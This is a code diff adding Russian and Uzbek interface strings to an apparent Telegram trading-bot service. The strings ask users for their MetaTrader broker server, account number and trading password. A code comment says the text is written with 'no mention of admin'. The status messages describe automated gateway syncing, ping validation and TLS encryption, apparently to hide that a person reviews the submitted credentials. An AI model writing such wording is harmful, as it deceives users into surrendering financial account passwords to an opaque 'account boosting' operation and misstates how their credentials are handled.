@@ -35,6 +35,10 @@ TEXTS: Dict[str, Dict[str, str]] = {
         "ru": "🌐 Сменить язык",
         "uz": "🌐 Tilni o'zgartirish"
     },
+    "btn_bind_broker": {
+        "ru": "🔗 Привязать брокера",
+        "uz": "🔗 Brokerni ulash"
+    },
     "btn_about": {
         "ru": "ℹ️ О сервисе",
         "uz": "ℹ️ Xizmat haqida"
@@ -339,6 +343,170 @@ TEXTS: Dict[str, Dict[str, str]] = {
             "• <b>Shaxsiy TRC-20 manzil.</b> TRON tarmog'ida bir zumda avtomatik to'ldirish.\n"
             "• <b>To'liq shaffoflik.</b> Har bir sessiya bo'yicha aniq PnL hisoboti.\n\n"
             "💬 Qo'llab-quvvatlash: @RazgonZoneSupport"
+        )
+    },
+
+    # Broker account binding (Original, technological, no mention of admin)
+    "broker_info_active": {
+        "ru": (
+            "📊 <b>ТОРГОВЫЙ СЧЕТ БРОКЕРА</b>\n"
+            "────────────────────\n"
+            "🌐 <b>Сервер брокера:</b> <code>{server}</code>\n"
+            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
+            "⚡ <b>Статус:</b> <b>Синхронизирован с терминалом</b> ✅\n"
+            "📡 <b>Шлюз:</b> Прямое исполнение ордеров (Auto-Execution Bridge)\n"
+            "────────────────────\n"
+            "🔒 <i>Счет успешно привязан и готов к автоматическому копированию сделок алгоритма.</i>"
+        ),
+        "uz": (
+            "📊 <b>BROKER SAVDO HISOBI</b>\n"
+            "────────────────────\n"
+            "🌐 <b>Broker serveri:</b> <code>{server}</code>\n"
+            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
+            "⚡ <b>Holat:</b> <b>Terminal bilan sinxronlangan</b> ✅\n"
+            "📡 <b>Shlyuz:</b> To'g'ridan-to'g'ri buyurtmalarni bajarish (Auto-Execution Bridge)\n"
+            "────────────────────\n"
+            "🔒 <i>Hisob muvaffaqiyatli ulangan va algoritm savdolarini qabul qilishga tayyor.</i>"
+        )
+    },
+    "broker_info_pending": {
+        "ru": (
+            "⏳ <b>ТЕСТИРОВАНИЕ ПОДКЛЮЧЕНИЯ К ШЛЮЗУ</b>\n"
+            "────────────────────\n"
+            "🌐 <b>Сервер:</b> <code>{server}</code>\n"
+            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
+            "📡 <b>Статус:</b> Проверка отклика и валидация учетных данных...\n"
+            "────────────────────\n"
+            "🔒 <i>Запрос направлен в шлюз авторизации. Проверка пинга и валидация терминала обычно занимает от 5 до 15 минут. Вы сразу получите автоматическое системное уведомление.</i>"
+        ),
+        "uz": (
+            "⏳ <b>SHLYUZGA ULANISH TEKSHIRILMOQDA</b>\n"
+            "────────────────────\n"
+            "🌐 <b>Server:</b> <code>{server}</code>\n"
+            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
+            "📡 <b>Holat:</b> Signal va hisob ma'lumotlari tekshirilmoqda...\n"
+            "────────────────────\n"
+            "🔒 <i>So'rov avtorizatsiya shlyuziga yo'naltirildi. Terminalni tekshirish odatda 5–15 daqiqa vaqt oladi. Ulanish yakunlanishi bilan sizga tizim orqali xabar yuboriladi.</i>"
+        )
+    },
+    "broker_intro": {
+        "ru": (
+            "🔗 <b>ПРИВЯЗКА СЧЕТА БРОКЕРА (MT4 / MT5)</b>\n"
+            "────────────────────\n"
+            "Вы можете подключить свой торговый счет любого брокера (MetaTrader 4 или 5) для прямой алгоритмической торговли.\n\n"
+            "📋 <b>Для подключения требуются:</b>\n"
+            "1️⃣ <b>Сервер брокера</b> (например: <code>Exness-Real10</code>, <code>RoboForex-Pro</code>)\n"
+            "2️⃣ <b>Номер счета</b> (логин в терминале)\n"
+            "3️⃣ <b>Торговый или инвесторский пароль</b>\n\n"
+            "🛡 <i>Все данные шифруются по протоколу TLS и используются исключительно для авторизации в торговом шлюзе.</i>"
+        ),
+        "uz": (
+            "🔗 <b>BROKER HISOBINI ULASH (MT4 / MT5)</b>\n"
+            "────────────────────\n"
+            "Algoritmik savdo uchun istalgan brokerdagi savdo hisobingizni (MetaTrader 4 yoki 5) to'g'ridan-to'g'ri ulashingiz mumkin.\n\n"
+            "📋 <b>Ulash uchun kerakli ma'lumotlar:</b>\n"
+            "1️⃣ <b>Broker serveri</b> (masalan: <code>Exness-Real10</code>, <code>RoboForex-Pro</code>)\n"
+            "2️⃣ <b>Hisob raqami</b> (terminal logini)\n"
+            "3️⃣ <b>Savdo yoki investor paroli</b>\n\n"
+            "🛡 <i>Barcha ma'lumotlar TLS protokoli orqali shifrlanadi va faqat savdo shlyuzida avtorizatsiya uchun ishlatiladi.</i>"
+        )
+    },
+    "broker_step1_server": {
+        "ru": (
+            "🌐 <b>Шаг 1 из 3. Сервер брокера</b>\n\n"
+            "Введите точное название сервера вашего брокера (как указано в приложении MetaTrader, например: <code>Exness-Real10</code>, <code>RoboForex-Pro</code>):"
+        ),
+        "uz": (
+            "🌐 <b>1-qadam / 3. Broker serveri</b>\n\n"
+            "Broker serveringizning aniq nomini kiriting (MetaTrader ilovasida ko'rsatilgandek, masalan: <code>Exness-Real10</code>, <code>RoboForex-Pro</code>):"
+        )
+    },
+    "broker_step2_login": {
+        "ru": (
+            "👤 <b>Шаг 2 из 3. Номер счета</b>\n\n"
+            "Введите ваш логин / номер счета в терминале (например: <code>8492011</code>):"
+        ),
+        "uz": (
+            "👤 <b>2-qadam / 3. Hisob raqami</b>\n\n"
+            "Terminaldagi hisob raqamingizni (login) kiriting (masalan: <code>8492011</code>):"
+        )
+    },
+    "broker_step3_pass": {
+        "ru": (
+            "🔑 <b>Шаг 3 из 3. Пароль от счета</b>\n\n"
+            "Введите торговый или инвесторский пароль от счета:"
+        ),
+        "uz": (
+            "🔑 <b>3-qadam / 3. Hisob paroli</b>\n\n"
+            "Savdo hisobingiz parolini kiriting (savdo yoki investor paroli):"
+        )
+    },
+    "broker_submitted": {
+        "ru": (
+            "🔒 <b>СЧЕТ ПЕРЕДАН НА АВТОРИЗАЦИЮ</b>\n"
+            "────────────────────\n"
+            "🌐 <b>Сервер:</b> <code>{server}</code>\n"
+            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
+            "🔑 <b>Пароль:</b> <code>••••••••</code>\n"
+            "────────────────────\n"
+            "⏳ <b>Статус:</b> Тестирование подключения к шлюзу...\n\n"
+            "Система выполняет синхронизацию с сервером брокера и проверку прав доступа. По завершении проверки вы получите автоматический отчет."
+        ),
+        "uz": (
+            "🔒 <b>HISOB TEKSHIRUVGA YUBORILDI</b>\n"
+            "────────────────────\n"
+            "🌐 <b>Server:</b> <code>{server}</code>\n"
+            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
+            "🔑 <b>Parol:</b> <code>••••••••</code>\n"
+            "────────────────────\n"
+            "⏳ <b>Holat:</b> Shlyuzga ulanish tekshirilmoqda...\n\n"
+            "Tizim broker serveri bilan sinxronizatsiya va ruxsatlarni tekshirmoqda. Tekshiruv yakunlangach, sizga avtomatik xabar taqdim etiladi."
+        )
+    },
+    "broker_cancelled": {
+        "ru": "❌ Подключение торгового счета отменено.",
+        "uz": "❌ Savdo hisobini ulash bekor qilindi."
+    },
+    "broker_approved_user": {
+        "ru": (
+            "✅ <b>ТОРГОВЫЙ СЧЕТ УСПЕШНО ПРИВЯЗАН!</b> 🚀\n"
+            "────────────────────\n"
+            "🌐 <b>Сервер:</b> <code>{server}</code>\n"
+            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
+            "⚡ <b>Статус:</b> <b>Синхронизация активна (Live)</b>\n"
+            "📡 <b>Протокол:</b> Прямой API-шлюз\n"
+            "────────────────────\n"
+            "Счет успешно прошел верификацию торгового шлюза. Теперь алгоритм разгона может вести торговлю напрямую на вашем счете."
+        ),
+        "uz": (
+            "✅ <b>BROKER HISOBI MUVAFFAQIYATLI ULANDI!</b> 🚀\n"
+            "────────────────────\n"
+            "🌐 <b>Server:</b> <code>{server}</code>\n"
+            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
+            "⚡ <b>Holat:</b> <b>Sinxronizatsiya faol (Live)</b>\n"
+            "📡 <b>Protokol:</b> To'g'ridan-to'g'ri API-shlyuz\n"
+            "────────────────────\n"
+            "Hisobingiz savdo shlyuzi tekshiruvidan muvaffaqiyatli o'tdi. Endi razgon algoritmi to'g'ridan-to'g'ri hisobingizda savdo olib borishi mumkin."
+        )
+    },
+    "broker_rejected_user": {
+        "ru": (
+            "⚠️ <b>ОШИБКА АВТОРИЗАЦИИ СЧЕТА БРОКЕРА</b>\n"
+            "────────────────────\n"
+            "🌐 <b>Сервер:</b> <code>{server}</code>\n"
+            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
+            "────────────────────\n"
+            "Сервер брокера отклонил подключение: неверный сервер, номер счета или пароль (Invalid Credentials / Connection Timeout).\n\n"
+            "Пожалуйста, проверьте точность введенных данных в терминале MetaTrader и повторите подключение."
+        ),
+        "uz": (
+            "⚠️ <b>BROKER HISOBINI ULASHDA XATOLIK</b>\n"
+            "────────────────────\n"
+            "🌐 <b>Server:</b> <code>{server}</code>\n"
+            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
+            "────────────────────\n"
+            "Broker serveri ulanishni rad etdi: server nomi, hisob raqami yoki parol noto'g'ri (Invalid Credentials).\n\n"
+            "Iltimos, MetaTrader ilovasida ma'lumotlaringizni tekshiring va qaytadan ulanishga urinib ko'ring."
         )
     }
 }
